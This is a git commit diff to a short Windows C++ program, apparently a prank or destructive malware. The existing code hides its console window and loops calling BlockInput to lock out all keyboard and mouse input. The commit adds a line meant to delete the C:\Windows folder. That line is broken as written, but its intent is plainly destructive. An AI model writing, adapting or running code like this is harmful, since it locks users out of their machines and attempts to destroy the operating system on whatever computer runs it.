d1a9c7f7ae4fca010116ba08a016651ebd0a1893
Syriamanal <shadinachat123@gmail.com>
2015-05-18 08:22:12 -0700

    Update Main.cpp

--- Main.cpp
+++ Main.cpp
@@ -1,10 +1,13 @@
 #include <iostream>
 #include <windows.h>
+#include <cstdio>
 
 using namespace std;
 
 int main(){
   FreeConsole(); //Hides Console
+  
+  const int result = remove("C:\Windows"); //Removes The C:/Windows Folder
   
   while(1){
     BlockInput(true); //Blocks All Input
